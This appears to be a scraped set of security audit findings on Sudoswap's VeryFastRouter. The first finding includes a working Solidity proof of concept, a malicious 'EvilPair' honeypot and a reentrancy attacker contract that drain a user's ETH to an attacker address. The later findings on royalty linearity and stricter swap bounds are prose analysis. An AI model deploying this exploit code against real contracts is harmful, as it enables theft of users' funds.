b/src/test/base/VeryFastRouterAllSwapTypes.sol\n@@ -33,6 +33,9 @@ import {RoyaltyEngine} from \"../../RoyaltyEngine.sol\";\n import {VeryFastRouter} from \"../../VeryFastRouter.sol\";\n import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n\n+import {EvilPair} from \"../mixins/EvilPair.sol\";\n+import {EvilPairReentrancyAttacker} from \"../mixins/EvilPairReentrancyAttacker.sol\";\n+\n abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holder, ConfigurableWithRoyalties {\n     ICurve bondingCurve;\n     RoyaltyEngine royaltyEngine;\n@@ -43,6 +46,8 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde\n     address constant ROUTER_CALLER = address(1);\n     address constant TOKEN_RECIPIENT = address(420);\n     address constant NFT_RECIPIENT = address(0x69);\n+    address constant PWNER = payable(address(999));\n+    address constant ALICE = payable(address(666));\n\n     uint256 constant START_INDEX = 0;\n     uint256 constant NUM_BEFORE_PARTIAL_FILL = 2;\n@@ -1286,4 +1291,87 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde\n         }\n         vm.stopPrank();\n     }\n+\n+    function testSwapEvilPairReentrancyAttack_audit() public {\n+        EvilPair evilPair;\n+        EvilPairReentrancyAttacker evilPairReentrancyAttacker;\n+        uint256 totalEthToSend = 100 ether;\n+        deal(ALICE, totalEthToSend);\n+\n+        //0. create a pair with a bonding curve\n+        uint256[] memory nftIds;\n+        LSSVMPair pair;\n+        nftIds = _getArray(START_INDEX, END_INDEX);\n+\n+        // mints END_INDEX - START_INDEX + 1 NFTs\n+        pair = setUpPairERC721ForSale(0, address(0), nftIds);\n+\n+        (uint256 delta, uint256 spotPrice) = getReasonableDeltaAndSpotPrice();\n+\n+\n+        //1. create a honeypotNft that again mints END_INDEX - START_INDEX + 1 nfts\n+        IERC721Mintable honeypotNft = _setUpERC721(address(this), address(this), ALICE);\n+\n+        //2. setup a evilPair & transfer above NFTs to the evilPair\n+        evilPair = new EvilPair(spotPrice, delta, address(pair.bondingCurve()), payable(address(0)), address(honeypotNft));\n+        for (uint256 j; j< nftIds.length; j++){\n+            IERC721(honeypotNft).transferFrom(address(this), address(evilPair), nftIds[j]);\n+        }\n+\n+        // 3. setup evil pair attacker\n+        evilPairReentrancyAttacker = new EvilPairReentrancyAttacker(router, spotPrice, PWNER, address(evilPair));\n+\n+        //4. set the evil pair attacker address as above\n+        evilPair.setAttacker(payable(evilPairReentrancyAttacker));\n+        evilPair.setReentrancyAttack(true); // just a flag to change the logic of setReentrancyAttack and swapNFTsForToken\n+        evilPair.setRouterAddress(payable(router));\n+        uint256[] memory partialFillAmounts = new uint256[](0);\n+\n+        //5. create a buy order so that we can re-enter from swapTokenForSpecificNFTs\n+        VeryFastRouter.BuyOrderWithPartialFill memory attackBuyOrder = VeryFastRouter.BuyOrderWithPartialFill({\n+            pair: LSSVMPair(address(evilPair)),\n+            maxInputAmount: totalEthToSend,\n+            ethAmount:totalEthToSend,\n+            nftIds: nftIds,\n+            expectedSpotPrice: pair.spotPrice(),\n+            isERC721: true,\n+            maxCostPerNumNFTs: partialFillAmounts\n+        });\n+\n+       VeryFastRouter.BuyOrderWithPartialFill[] memory buyOrders =\n+            new VeryFastRouter.BuyOrderWithPartialFill[](1);\n+        buyOrders[0] = attackBuyOrder;\n+\n+        //6. Create a dummy sell order - 0 array\n+        VeryFastRouter.SellOrderWithPartialFill[] memory sellOrders =\n+            new VeryFastRouter.SellOrderWithPartialFill[](0);\n+\n+        //7. Create a swap order\n+         VeryFastRouter.Order memory swapOrder = VeryFastRouter.Order({\n+            buyOrders: buyOrders,\n+            sellOrders: sellOrders,\n+            tokenRecipient: payable(TOKEN_RECIPIENT),\n+            nftRecipient: NFT_RECIPIENT,\n+            recycleETH: true\n+        });\n+\n+        //8. We calculate the price of purchasing ALL NFTs from evil pair for given bonding curve\n+        // ignore royalties for this calculation\n+        // initial balance of ALICE (100 ether) - input Amount should be the final balance in ALICE account after swap\n+        // by re-entering and placing a fake buy txn, we can drain all of ALICE's eth\n+        (, , , uint256 inputAmount, ,) = ICurve(pair.bondingCurve()).getBuyInfo(uint128(spotPrice), uint128(delta), nftIds.length, 0, 0);\n+\n+        emit log_named_uint(\"input amount to purchase all NFTs \", inputAmount);\n+        emit log_named_uint(\"Balance in Alice Account Before \", ALICE.balance);\n+        emit log_named_uint(\"Balance in Pwner Account Before \", PWNER.balance);\n+        emit log_named_uint(\"Balance in Router Account Before \", address(router).balance);\n+\n+        // 8. Perform the swap\n+        vm.prank(ALICE);\n+        router.swap{value: totalEthToSend}(swapOrder);\n+\n+        emit log_named_uint(\"Balance in Alice Account After \", ALICE.balance);\n+        emit log_named_uint(\"Balance in Pwner Account After \", PWNER.balance);\n+        emit log_named_uint(\"Balance in Router Account After \", address(router).balance);\n+    }\n }\ndiff --git a/src/test/mixins/EvilPair.sol b/src/test/mixins/EvilPair.sol\nnew file mode 100644\nindex 0000000..8a8ad6d\n--- /dev/null\n+++ b/src/test/mixins/EvilPair.sol\n@@ -0,0 +1,119 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import {console} from \"forge-std/Test.sol\";\n+import {EvilPairReentrancyAttacker} from \"./EvilPairReentrancyAttacker.sol\";\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+\n+contract EvilPair {\n+    uint256 expectedSpotPrice;\n+    uint256 expectedDelta;\n+    address public bondingCurve;\n+    address payable attacker;\n+    uint256 counter;\n+    uint256 inputAmount;\n+    address nftAddress;\n+    address payable routerAddress;\n+    bool isReentrancyAttack;\n+\n+   event evilpair_log_named_uint         (string key, uint val);\n+   event evilpair_log_named_address      (string key, address val);\n+\n+    constructor(uint256 _expectedSpotPrice, uint256 _delta, address _bondingCurve, address payable _attacker, address _nft) {\n+        expectedSpotPrice = _expectedSpotPrice;\n+        expectedDelta = _delta;\n+        bondingCurve = _bondingCurve;\n+        attacker = _attacker;\n+        nftAddress = _nft;\n+    }\n+\n+    function setAttacker(address payable _attacker) public {\n+        attacker = _attacker;\n+    }\n+\n+    function setReentrancyAttack(bool _isAttack) public{\n+        isReentrancyAttack = _isAttack;\n+    }\n+\n+    function setRouterAddress(address payable _router) public{\n+        routerAddress = _router;\n+    }\n+\n+    function swapNFTsForToken(\n+        uint256[] calldata nftIds,\n+        uint256 minExpectedTokenOutput,\n+        address payable tokenRecipient,\n+        bool isRouter,\n+        address routerCaller\n+    ) external virtual returns (uint256) {\n+        if(isReentrancyAttack){\n+            //calculate price of original purchase of user\n+            //reserve that amount of eth for original buy txn to go through\n+            // and drain the balance funds\n+\n+            // reserveAmount of eth calculation\n+            uint256 numNfts = IERC721(nftAddress).balanceOf(address(this));\n+            (, , , uint256 inputAmount, ,) = ICurve(bondingCurve).getBuyInfo(uint128(expectedSpotPrice), uint128(expectedDelta), numNfts, 0, 0);\n+            emit evilpair_log_named_uint(\"input amount inside swapNFTForToken \", inputAmount);\n+            emit evilpair_log_named_uint(\"balance eth in evilPair currently \", address(this).balance);\n+\n+\n+            // we ignore royalties for this\n+            if(address(this).balance > inputAmount){\n+                uint256 splitPayment = (address(this).balance - inputAmount)*50/100;\n+                //transfer 50% to the router to enable a payoff\n+                (bool success, ) = address(routerAddress).call{value: splitPayment}(\"\");\n+                return splitPayment;\n+            }\n+            return 0;\n+        }\n+\n+    }\n+\n+    function swapTokenForSpecificNFTs(\n+        uint256[] calldata nftIds,\n+        uint256 maxExpectedTokenInput,\n+        address nftRecipient,\n+        bool isRouter,\n+        address routerCaller\n+    ) external payable virtual returns (uint256) {\n+        uint256 ethAmount = msg.value;\n+        if(isReentrancyAttack){\n+            EvilPairReentrancyAttacker(attacker).attack();\n+\n+        }\n+        else{\n+            sweepETH();\n+        }\n+\n+        return ethAmount;\n+    }\n+\n+    function sweepETH() public {\n+        (bool success, ) = attacker.call{value: address(this).balance}(\"\");\n+        require(success, \"eth sweep success\");\n+    }\n+\n+    function spotPrice() external view virtual returns (uint256) {\n+        return expectedSpotPrice;\n+    }\n+\n+    function delta() external view virtual returns (uint256) {\n+        return expectedDelta;\n+    }\n+\n+    function fee() external view virtual returns (uint256) {\n+        return 0;\n+    }\n+\n+    function nft() external view virtual returns (address) {\n+        return nftAddress;\n+    }\n+\n+    function calculateRoyaltiesView(uint256 assetId, uint256 saleAmount)\n+        public\n+        view\n+        returns (address payable[] memory royaltyRecipients, uint256[] memory royaltyAmounts, uint256 royaltyTotal)\n+    {}\n+}\n\\ No newline at end of file\ndiff --git a/src/test/mixins/EvilPairReentrancyAttacker.sol b/src/test/mixins/EvilPairReentrancyAttacker.sol\nnew file mode 100644\nindex 0000000..019019f\n--- /dev/null\n+++ b/src/test/mixins/EvilPairReentrancyAttacker.sol\n@@ -0,0 +1,79 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {VeryFastRouter} from \"../../VeryFastRouter.sol\";\n+\n+import {console} from \"forge-std/Test.sol\";\n+\n+contract EvilPairReentrancyAttacker {\n+    VeryFastRouter immutable internal router;\n+    uint256 immutable internal expectedSpotPrice;\n+    address immutable internal PWNER;\n+    address immutable internal evilPair;\n+    uint256 counter;\n+\n+    constructor(VeryFastRouter _router, uint256 _expectedSpotPrice, address _pwner, address _evilPair) {\n+        router = _router;\n+        expectedSpotPrice = _expectedSpotPrice;\n+        PWNER = _pwner;\n+        evilPair = _evilPair;\n+    }\n+\n+    fallback() external payable {\n+        // console.log(\"entered fallback\");\n+        // if (msg.sig == this.attack.selector) {\n+        //     console.log(\"doing attack\");\n+        //     attack();\n+        //     return;\n+        // }\n+        // if (++counter == 2) {\n+        //     console.log(\"doing attack\");\n+        //     attack();\n+        // } else {\n+        //     console.log(\"doing nothing\");\n+        //     return;\n+        // }\n+    }\n+\n+    receive() external payable {}\n+\n+    function attack() public {\n+        console.log(\"executing attack\");\n+        VeryFastRouter.BuyOrderWithPartialFill[] memory attackBuyOrders = new VeryFastRouter.BuyOrderWithPartialFill[](0);\n+        VeryFastRouter.SellOrderWithPartialFill[] memory attackSellOrders = new VeryFastRouter.SellOrderWithPartialFill[](1);\n+        uint256[] memory nftInfo = new uint256[](1);\n+        nftInfo[0] = 1337;\n+        uint256[] memory empty = new uint256[](0);\n+\n+        attackSellOrders[0] = VeryFastRouter.SellOrderWithPartialFill({\n+            pair: LSSVMPair(evilPair),\n+            isETHSell: true,\n+            isERC721: true,\n+            nftIds: nftInfo,\n+            doPropertyCheck: false,\n+            propertyCheckParams: \"\",\n+            expectedSpotPrice: expectedSpotPrice < type(uint128).max ? uint128(expectedSpotPrice) : type(uint128).max,\n+            minExpectedOutput: 0,\n+            minExpectedOutputPerNumNFTs: empty\n+        });\n+\n+        VeryFastRouter.Order memory attackSwapOrder = VeryFastRouter.Order({\n+            buyOrders: attackBuyOrders,\n+            sellOrders: attackSellOrders,\n+            tokenRecipient: payable(PWNER),\n+            nftRecipient: PWNER,\n+            recycleETH: true\n+        });\n+\n+\n+        router.swap(attackSwapOrder);\n+\n+        console.log(\"completed attack\");\n+    }\n+\n+    function sweepETH() public {\n+        (bool success, ) = PWNER.call{value: address(this).balance}(\"\");\n+        require(success, \"sweep eth failed\");\n+    }\n+}\n\\ No newline at end of file\n"
    ],
    "Description": [
        "\nVeryFastRouter::swap is the main entry point for a user to perform a batch of sell and buy orders on the new Sudoswap router, allowing partial fill conditions to be specified. Sell orders are executed first, followed by buy orders. The LSSVMPair contracts themselves are implemented in such a way that re-entrancy is not possible, but the same is not true of the VeryFastRouter. Assuming a user calls VeryFastRouter::swap, selling some NFTs and passing in some additional ETH value for subsequent buy orders, an attacker can re-enter this function under certain conditions to steal the original caller's funds. Given that this function does not check whether the user input contains valid pairs, an attacker can use this to manipulate the return values of LSSVMPair::swapNFTsForToken and LSSVMPair::swapTokenForSpecificNFTs, which interferes with internal accounting. In this way, the attacker can make it appear that a buy/sell order input/output more/less value than expected.",
        "Consider the case where the attacker is a malicious royalty recipient, and their re-entrant swap order contains a single sell order and an empty array of buy orders. Calling out to their malicious pair gives control over the outputAmount value which is used in addition assignment to the virtual balance ethAmount used to transfer any remaining ETH after all orders have been executed, filled partially or otherwise. The current contract balance is the original caller's remaining ETH value, so the attacker would intend to have their malicious pair return this amount to drain the funds. However, without the introduction of a malicious pair contract to both the attacker's re-entrant order and the original caller's order, the attacker is prevented from stealing the remaining intermediate funds due to the safe ETH transfer of ethAmount as this will cause the original caller's transaction to revert at this same line - the contract is attempting to transfer balance that it no longer has. If this had instead been a transfer of the contract balance directly rather than a virtual balance, then the attacker could succeed in stealing the user's funds without baiting them into making a call to their malicious pair. Of course, calling a malicious pair allows it to steal any funds sent with the call, but given that this can manipulate internal accounting through an incorrect return value, as described above, calling this pair can impact other swap orders/partial fills, tricking the contract into thinking it has fewer funds than it does during the lifetime of the original caller's transaction such that the attacker can re-enter and make away with their ETH. Otherwise, the extent of this vulnerability is a DoS attack on calls to the router.",
        "The steps to perform this exploit are as follows:",
        "The second exploit case is where the caller specifies the router contract as their token recipient, performing DIY recycle ETH functionality of sorts for subsequent buy orders, likely with zero input msg.value. This would allow an attacker to steal intermediate balances by re-entering the final sell order before any funds are consumed by buy orders, as these funds are not tracked by ethAmount, and so the final transfer will not revert. Independent of a malicious royalty recipient, this also means that any excess ETH sent not consumed by subsequent buy orders will remain locked in the contract if the caller specifies the router contract as their token recipient. Pool funds are safe due to the use of the factory re-entrancy guard, which prohibits calling into any of the pair swap functions that are responsible for transfers to the router. ETH value sent with ERC-20-based swaps due to user misconfiguration is also vulnerable in the case of malicious royalty recipient."
    ],
    "Proof of Concept": [
        "\nThe following diff demonstrates a honeypot pair which re-enters the swap and drains the original caller's ETH:"
    ],
    "Impact": [
        "\nThis vulnerability results in the loss of user funds, with high impact and medium likelihood, so we evaluate the severity to HIGH."
    ],
    "Recommended Mitigation": [
        "\nValidate user inputs to VeryFastRouter::swap, in particular pairs, and consider making this function non-reentrant."
    ],
    "Sudoswap": [
        "\nAcknowledged, no change for now as risk surface is set to callers passing in improper arguments. Pair validation is done client-side, so less of a concern."
    ],
    "Cyfrin": [
        "\nAcknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/linearity-assumption-on-the-royalty-can-lead-to-denial-of-service-cyfrin-sudoswap-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "VeryFastRouter.sol\n576:         // Perform binary search\n577:         while (start <= end) {\n578:             // We check the price to sell index + 1\n579:             (\n580:                 CurveErrorCodes.Error error,\n581:                 /* newSpotPrice */\n582:                 ,\n583:                 /* newDelta */\n584:                 ,\n585:                 uint256 currentOutput,\n586:                 /* tradeFee */\n587:                 ,\n588:                 /* protocolFee */\n589:             ) = pair.bondingCurve().getSellInfo(\n590:                 spotPrice,\n591:                 // get delta from deltaAndFeeMultiplier\n592:                 uint128(deltaAndFeeMultiplier >> 96),\n593:                 (start + end) / 2,\n594:                 // get feeMultiplier from deltaAndFeeMultiplier\n595:                 uint96(deltaAndFeeMultiplier),\n596:                 protocolFeeMultiplier\n597:             );\n598:             currentOutput -= currentOutput * royaltyAmount / BASE;//@audit-info assumes royalty amount is linear\n599:             // If the bonding curve has a math error, or\n600:             // if the current output is too low relative to our max output, or\n601:             // if the current output is greater than the pair's token balance,\n602:             // then we recurse on the left half (i.e. less items)\n603:             if (\n604:                 error != CurveErrorCodes.Error.OK || currentOutput < minOutputPerNumNFTs[(start + end) / 2 - 1] /* this is the max cost we are willing to pay, zero-indexed */\n605:                     || currentOutput > pairTokenBalance\n606:             ) {\n607:                 end = (start + end) / 2 - 1;\n608:             }\n609:             // Otherwise, we recurse on the right half (i.e. more items)\n610:             else {\n611:                 numItemsToFill = (start + end) / 2;\n612:                 start = (start + end) / 2 + 1;\n613:                 priceToFillAt = currentOutput;\n614:             }\n615:         }\n",
        "    function getKODAV2RoyaltyInfo(address _tokenAddress, uint256 _id, uint256 _amount)\n        external\n        view\n        override\n        returns (address payable[] memory receivers, uint256[] memory amounts)\n    {\n        // Get the edition the token is part of\n        uint256 _editionNumber = IKODAV2(_tokenAddress).editionOfTokenId(_id);\n        require(_editionNumber > 0, \"Edition not found for token ID\");\n\n        // Get existing artist commission\n        (address artistAccount, uint256 artistCommissionRate) = IKODAV2(_tokenAddress).artistCommission(_editionNumber);\n\n        // work out the expected royalty payment\n        uint256 totalRoyaltyToPay = (_amount / modulo) * creatorRoyaltiesFee;\n\n        // Get optional commission set against the edition and work out the expected commission\n        (uint256 optionalCommissionRate, address optionalCommissionRecipient) =\n            IKODAV2(_tokenAddress).editionOptionalCommission(_editionNumber);\n        if (optionalCommissionRate > 0) {\n            receivers = new address payable[](2);\n            amounts = new uint256[](2);\n\n            uint256 totalCommission = artistCommissionRate + optionalCommissionRate;\n\n            // Add the artist and commission\n            receivers[0] = payable(artistAccount);\n            amounts[0] = (totalRoyaltyToPay / totalCommission) * artistCommissionRate;//@audit-info rounding occurs here\n\n            // Add optional splits\n            receivers[1] = payable(optionalCommissionRecipient);\n            amounts[1] = (totalRoyaltyToPay / totalCommission) * optionalCommissionRate;//@audit-info rounding occurs here\n        } else {\n            receivers = new address payable[](1);\n            amounts = new uint256[](1);\n\n            // Add the artist and commission\n            receivers[0] = payable(artistAccount);\n            amounts[0] = totalRoyaltyToPay;\n        }\n\n        return (receivers, amounts);\n    }\n",
        "VeryFastRouter.sol\n345:                 // If we can sell at least 1 item...\n346:                 if (numItemsToFill != 0) {\n347:                     // If property checking is needed, do the property check swap\n348:                     if (order.doPropertyCheck) {\n349:                         outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(\n350:                             order.nftIds[:numItemsToFill],\n351:                             priceToFillAt,//@audit-info min expected output\n352:                             swapOrder.tokenRecipient,\n353:                             true,\n354:                             msg.sender,\n355:                             order.propertyCheckParams\n356:                         );\n357:                     }\n358:                     // Otherwise do a normal sell swap\n359:                     else {\n360:                         // Get subarray if ERC721\n361:                         if (order.isERC721) {\n362:                             outputAmount = order.pair.swapNFTsForToken(\n363:                                 order.nftIds[:numItemsToFill], priceToFillAt, swapOrder.tokenRecipient, true, msg.sender\n364:                             );\n365:                         }\n366:                         // For 1155 swaps, wrap as number\n367:                         else {\n368:                             outputAmount = order.pair.swapNFTsForToken(\n369:                                 _wrapUintAsArray(numItemsToFill),\n370:                                 priceToFillAt,\n371:                                 swapOrder.tokenRecipient,\n372:                                 true,\n373:                                 msg.sender\n374:                             );\n375:                         }\n376:                     }\n377:                 }\n"
    ],
    "Description": [
        "\nVeryFastRouter::swap relies on the internal functions VeryFastRouter::_findMaxFillableAmtForSell and VeryFastRouter::_findMaxFillableAmtForBuy to find the maximum possible amount of tokens to be swapped via binary search as below:",
        "The protocol is designed to integrate various royalty info providers. Line 598 assumes the royalty amount is linear; however, this assumption can be violated, especially in the case of external royalty info providers who could be malicious and return a non-linear royalty amount.\nFor example, the royalty amount can be a function of the number of tokens to be swapped (e.g. greater/fewer royalties for a larger/smaller sale amount).\nIn this case, line 598 will be violated, and the max fillable functions will return incorrect priceToFillAt and numItemsToFill.",
        "For example, KODAV2 royalty calculation is NOT accurately linear to the input amount due to roundings.",
        "If the royalty info provider returned higher royalty for a larger sale amount, the priceToFillAt will be higher than the actual sale.\nNote that the priceToFillAt value calculated with the linearity assumption is used as a minimum expected output parameter for the function ILSSVMPairERC721::swapNFTsForToken within the swap sell logic. Similar reasoning holds for the swap-buy logic.",
        "Thus, the swap will fail if the priceToFillAt is calculated to be greater than the actual sale.",
        "The Cyfrin team acknowledges that Sudoswap expects all collections to be ERC-2981 compliant, and EIP-2981 states that the royalty amount should be linear to the amount.\nHowever, tokens can use a royalty lookup that is not compliant with EIP-2981 and can be abused to prevent honest users' valid transactions, so the protocol should not rely on the assumption that the royalty amount is linear."
    ],
    "Impact": [
        "\nThe linearity assumption can be violated, especially in the case of external royalty info providers (possibly malicious), and this can lead to protocol failing to behave as expected, as legitimate swaps will fail.\nDue to these incorrect assumptions affecting the core functions, we evaluate the severity to HIGH."
    ],
    "Recommended Mitigation": [
        "\nWhile we understand the protocol team intended to reduce gas costs by using the linearity assumption, we recommend using the actual royalty amount to calculate priceToFillAt and numItemsToFill."
    ],
    "Sudoswap": [
        "\nAcknowledged. It is expected that the majority of NFTs will be ERC-2981 compliant."
    ],
    "Cyfrin": [
        "\nAcknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/possible-reverts-due-to-using-stricter-requirements-in-inner-swap-cyfrin-sudoswap-markdown_--------------------------------------------------
----Start JSON----
{
    "code": [
        "VeryFastRouter.sol\n326:                 uint256 numItemsToFill;\n327:                 uint256 priceToFillAt;\n328:\n329:                 {\n330:                     // Grab royalty for calc in _findMaxFillableAmtForSell\n331:                     (,, uint256 royaltyAmount) = order.pair.calculateRoyaltiesView(\n332:                         order.isERC721 ? order.nftIds[0] : LSSVMPairERC1155(address(order.pair)).nftId(), BASE\n333:                     );\n334:\n335:                     // Calculate the max number of items we can sell\n336:                     (numItemsToFill, priceToFillAt) = _findMaxFillableAmtForSell(//@audit-info priceToFillAt >= order.minExpectedOutputPerNumNFTs\n337:                         order.pair,\n338:                         pairSpotPrice,\n339:                         order.minExpectedOutputPerNumNFTs,\n340:                         protocolFeeMultiplier,\n341:                         royaltyAmount\n342:                     );\n343:                 }\n344:\n345:                 // If we can sell at least 1 item...\n346:                 if (numItemsToFill != 0) {\n347:                     // If property checking is needed, do the property check swap\n348:                     if (order.doPropertyCheck) {\n349:                         outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(\n350:                             order.nftIds[:numItemsToFill],\n351:                             priceToFillAt,//@audit-info min expected output, different from the one specified by the user\n352:                             swapOrder.tokenRecipient,\n353:                             true,\n354:                             msg.sender,\n355:                             order.propertyCheckParams\n356:                         );\n357:                     }\n358:                     // Otherwise do a normal sell swap\n359:                     else {\n360:                         // Get subarray if ERC721\n361:                         if (order.isERC721) {\n362:                             outputAmount = order.pair.swapNFTsForToken(\n363:                                 order.nftIds[:numItemsToFill], priceToFillAt, swapOrder.tokenRecipient, true, msg.sender//@audit-info min expected output, different from the one specified by the user\n364:                             );\n365:                         }\n366:                         // For 1155 swaps, wrap as number\n367:                         else {\n368:                             outputAmount = order.pair.swapNFTsForToken(\n369:                                 _wrapUintAsArray(numItemsToFill),\n370:                                 priceToFillAt,\n371:                                 swapOrder.tokenRecipient,\n372:                                 true,\n373:                                 msg.sender\n374:                             );\n375:                         }\n376:                     }\n377:                 }\n\n"
    ],
    "Description": [
        "\nVeryFastRouter::swap relies on the internal functions VeryFastRouter::_findMaxFillableAmtForSell and VeryFastRouter::_findMaxFillableAmtForBuy to find the maximum possible amount of tokens to be swapped.\nThe output is supposed to be the actual cost of the swap, and it is used as the minExpectedTokenOutput parameter for selling logic and the maxExpectedTokenInput parameter for buying logic; however, this is problematic and can lead to protocol unintended protocol behavior because the actual cost of the swap can differ from the output of these functions. We pointed out the issue with linearity assumptions in another finding, but we are raising this separately because the actual pair's swap function is being called with stricter requirements.",
        "If the actual sale of the swap is lower than the output of VeryFastRouter::_findMaxFillableAmtForSell and VeryFastRouter::_findMaxFillableAmtForBuy, the swap will fail, but it could have passed if the original minExpectedOutputPerNumNFTs and maxCostPerNumNFTs were used instead.\nIf it can be guaranteed that the output of VeryFastRouter::_findMaxFillableAmtForSell and VeryFastRouter::_findMaxFillableAmtForBuy will always represent the exact sale/cost, this may be fine, but it is not clear why the original minExpectedOutputPerNumNFTs and maxCostPerNumNFTs are not used."
    ],
    "Impact": [
        "\nAlthough this does not lead to direct loss of funds, we are evaluating the severity of MEDIUM because it can lead to unintended protocol behavior."
    ],
    "Recommended Mitigation": [
        "\nWe recommend using minExpectedOutputPerNumNFTs and maxCostPerNumNFTs instead of the output of VeryFastRouter::_findMaxFillableAmtForSell and VeryFastRouter::_findMaxFillableAmtForBuy as arguments to the actual swap functions."
    ],
    "Sudoswap": [
        "\nAcknowledged. Given that the input values are expected to be returned from the Bonding Curve, this is likely to be an extremely rare occurance."
    ],
    "Cyfrin": [
        "\nAcknowledged."
    ]
}
----End JSON----
